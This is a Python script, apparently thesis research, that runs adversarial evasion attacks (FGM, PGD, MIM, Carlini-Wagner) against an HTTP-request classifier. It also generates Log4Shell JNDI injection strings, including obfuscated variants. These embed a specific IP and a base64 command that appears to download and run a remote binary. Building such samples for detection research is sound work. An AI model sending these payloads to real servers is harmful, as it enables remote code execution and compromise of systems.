import io
import os
from urllib.request import CacheFTPHandler
from matplotlib.font_manager import json_dump
import secml
from secml.data import CDataset
from sklearn.model_selection import train_test_split


urls = '/Users/jan/Documents/Master_Thesis/HTTP_CSIC_2010/url_list.txt'

malicious_ip = '84.247.48.62:12344'
malicious_content = '/Basic/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS5eDY='
methods = ['post', 'get', 'put']

full_size = 72000


def perform_evasion_cleverhans(observed_data, label_data, random_state, clf, t_size):
    import secml
    import torch
    import cleverhans

    n_tr = int(full_size * (1- t_size))  # Number of training set samples
    n_ts = int(full_size * t_size)  # Number of test set samples

    from secml.ml.classifiers import CClassifierSkLearn
    # use generic wrapper for sklearn model and make it CClassifier
    clf = CClassifierSkLearn(clf)

    from secml.array import CArray
    # store spare-matrix in list of sparse matrix in array
    observed_data = list(observed_data.toarray())
    #observed_data = observed_data.toarray()
    # make lists of array to CArray
    observed_data = CArray(observed_data, tosparse=True)
    label_data = CArray(label_data)

    dataset = CDataset(observed_data, label_data)

    print('Shape of observed_data: ', observed_data.shape)
    print('Shape of label_data: ', label_data.shape)
    print(observed_data.dtype)
    print(label_data.dtype)
    if observed_data.is_vector_like: 
        print('Is vector')

    # Split in training and test
    from secml.data.splitter import CTrainTestSplit
    splitter = CTrainTestSplit(train_size=n_tr, test_size=n_ts, random_state=random_state)
    tr, ts = splitter.split(dataset)

    # Normalize the data
    from secml.ml.features import CNormalizerMinMax

    nmz = CNormalizerMinMax()
    tr.X = nmz.fit_transform(tr.X)
    ts.X = nmz.transform(ts.X)

    from secml.array import CArray

    # x0, y0 = ts[5, :].X, ts[5, :].Y  # Initial sample
    x0, y0 = CArray([0.7, 0.4]), CArray([1])
    lb, ub = 0, 1
    dmax = 0.4
    y_target = 2

    from cleverhans.attack import CarliniWagnerL2, ProjectedGradientDescent, MomentumIterativeMethod,FastGradientMethod

    from collections import namedtuple
    Attack = namedtuple('Attack', 'attack_cls short_name attack_params')

    attacks = [
        Attack(FastGradientMethod, 'FGM', {'eps': dmax,
                                       'clip_max': ub,
                                       'clip_min': lb,
                                       'ord': 2}),
        Attack(ProjectedGradientDescent, 'PGD', {'eps': dmax,
                                             'eps_iter': 0.05,
                                             'nb_iter': 50,
                                             'clip_max': ub,
                                             'clip_min': lb,
                                             'ord': 2,
                                             'rand_init': False}),
        Attack(MomentumIterativeMethod, 'MIM', {'eps': dmax,
                                            'eps_iter': 0.05,
                                            'nb_iter': 50,
                                            'clip_max': ub,
                                            'clip_min': lb,
                                            'ord': 2,
                                            'decay_factor': 1}),
        Attack(CarliniWagnerL2, 'CW2', {'binary_search_steps': 1,
                                    'initial_const': 0.2,
                                    'confidence': 10,
                                    'abort_early': True,
                                    'clip_min': lb,
                                    'clip_max': ub,
                                    'max_iterations': 50,
                                    'learning_rate': 0.1})]

    from secml.figure import CFigure
    from secml.adv.attacks import CAttackEvasionCleverhans

    fig = CFigure(width=20, height=15)

    for i, attack in enumerate(attacks):
        fig.subplot(2, 2, i + 1)

        fig.sp.plot_decision_regions(clf,
                                 plot_background=False,
                                 n_grid_points=100)

        cleverhans_attack = CAttackEvasionCleverhans(
            classifier=clf,
            y_target=y_target,
            clvh_attack_class=attack.attack_cls,
            **attack.attack_params)

        # Run the evasion attack on x0
        print("Attack {:} started...".format(attack.short_name))
        y_pred_CH, _, adv_ds_CH, _ = cleverhans_attack.run(x0, y0)
        print("Attack finished!")

        fig.sp.plot_fun(cleverhans_attack.objective_function, multipoint=True, plot_levels=False, n_grid_points=50, alpha=0.6)

        print("Original x0 label: ", y0.item())
        print("Adversarial example label ({:}): "
          "".format(attack.attack_cls.__name__), y_pred_CH.item())

        print("Number of classifier function evaluations: {:}"
          "".format(cleverhans_attack.f_eval))
        print("Number of classifier gradient evaluations: {:}"
          "".format(cleverhans_attack.grad_eval))

        fig.sp.plot_path(cleverhans_attack.x_seq)
        fig.sp.title(attack.short_name)
        fig.sp.text(0.2, 0.92, "f_eval:{}\ngrad_eval:{}"
                           "".format(cleverhans_attack.f_eval,
                                     cleverhans_attack.grad_eval),
                bbox=dict(facecolor='white'), horizontalalignment='right')
    fig.show()





############### FROM SECML ###############
def perfom_evasion_attack(observed_data, label_data, random_state, clf, t_size):
    n_tr = int(full_size * (1- t_size))  # Number of training set samples
    n_ts = int(full_size * t_size)  # Number of test set samples

    from secml.ml.classifiers import CClassifierSkLearn
    # use generic wrapper for sklearn model and make it CClassifier
    clf = CClassifierSkLearn(clf)

    from secml.array import CArray
    # store spare-matrix in list of sparse matrix in array
    observed_data = list(observed_data.toarray())
    #observed_data = observed_data.toarray()
    # make lists of array to CArray
    observed_data = CArray(observed_data, tosparse=True)
    label_data = CArray(label_data)

    dataset = CDataset(observed_data, label_data)

    print('Shape of observed_data: ', observed_data.shape)
    print('Shape of label_data: ', label_data.shape)
    print(observed_data.dtype)
    print(label_data.dtype)
    if observed_data.is_vector_like: 
        print('Is vector')

    # Split in training and test
    from secml.data.splitter import CTrainTestSplit
    splitter = CTrainTestSplit(train_size=n_tr, test_size=n_ts, random_state=random_state)
    tr, ts = splitter.split(dataset)

    print('######################### TR #############################')
    print(tr)
    print('######################### TR #############################')
    print(ts)

    # Metric to use for training and performance evaluation
    from secml.ml.peval.metrics import CMetricAccuracy
    metric = CMetricAccuracy()
    
    '''shuffle=True for randomization of data before splitting'''
    #X_train, X_test, y_train, y_test = train_test_split(observed_data, label_data, test_size=t_size, random_state=4)

    # create CDataset of training data
    #tr = CDataset(X_train, y_train)


    x0, y0 = ts[1, :].X, ts[1, :].Y  # Initial sample

    noise_type = 'l1'  # Type of perturbation 'l1' or 'l2'
    dmax = 0.4  # Maximum perturbation
    lb, ub = 0, 1  # Bounds of the attack space. Can be set to `None` for unbounded
    y_target = None  # None if `error-generic` or a class label for `error-specific`

    # Should be chosen depending on the optimization problem
    solver_params = {
        'eta': 0.3,
        'eta_min': 0.1,
        'eta_max': None,
        'max_iter': 1000,
        'eps': 1e-4
    }   

    from secml.adv.attacks.evasion import CAttackEvasionPGDLS
    pgd_ls_attack = CAttackEvasionPGDLS(
        classifier=clf,
        double_init_ds=tr,
        double_init=False,
        distance=noise_type,
        dmax=dmax,
        lb=lb, ub=ub,
        solver_params=solver_params,
        y_target=y_target)

    print(x0)

    # Run the evasion attack on x0
    y_pred_pgdls, _, adv_ds_pgdls, _ = pgd_ls_attack.run(x0, y0)

    '''

    # Run the evasion attack on x0
    y_pred_pgdls, _, adv_ds_pgdls, _ = pgd_ls_attack.run(x0, y0)

    print("Original x0 label: ", y0.item())
    print("Adversarial example label (PGD-LS): ", y_pred_pgdls.item())

    print("Number of classifier gradient evaluations: {:}"
        "".format(pgd_ls_attack.grad_eval))
    '''

############### FROM SECML ###############


#additional options
    #"jndi:ldap" ,
    #"jndi:dns" ,
    #"jndi:rmi" ,
    #"j}ndi" ,
    #"jndi%3Aldap" ,
    #"jndi%3Aldns" ,

jndi_list = [
    "${jndi:ldap://" ,
    "${jndi:ldap://" ,
    "${jndi:ldap://" ,
    "${${::-j}${::-n}${::-d}${::-i}://" ,
    "${${::-j}ndi://",
    "${${lower:jndi}://"
]

malicious_ip = '84.247.48.62:12344'
malicious_content = '/Basic/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS5eDY='
methods = ['post', 'get', 'put']


def create_log4j_request(method, url, payload):
    req = method + url + '/' + payload
    return req

def create_payload(list, ip, content):
    payload_list = []
    for jndi in list:
        payload_list.append(jndi + ip + content)
    return payload_list

def build_adversarial_list(url_list):
    adversarial_list = []
    payload_list = create_payload(list=jndi_list, ip=malicious_ip, content=malicious_content)

    for m in methods:
        for url in url_list:
            for payload in payload_list:
                adversarial_list.append(create_log4j_request(m, url.rstrip(), payload))
    return adversarial_list
'''
file = open(urls)
url_list = file.readlines()

ad_list = build_adversarial_list(url_list)


if not os.path.exists('/Users/jan/Documents/GitHub/ma-thesis_cs20m019/adversarial.txt'):
    fout = io.open('/Users/jan/Documents/GitHub/ma-thesis_cs20m019/adversarial.txt', "w", encoding="utf-8")
    for line in ad_list:
        fout.write(line + '\n')
    print("finished parse ",len(ad_list)," requests")
    fout.close()
 '''
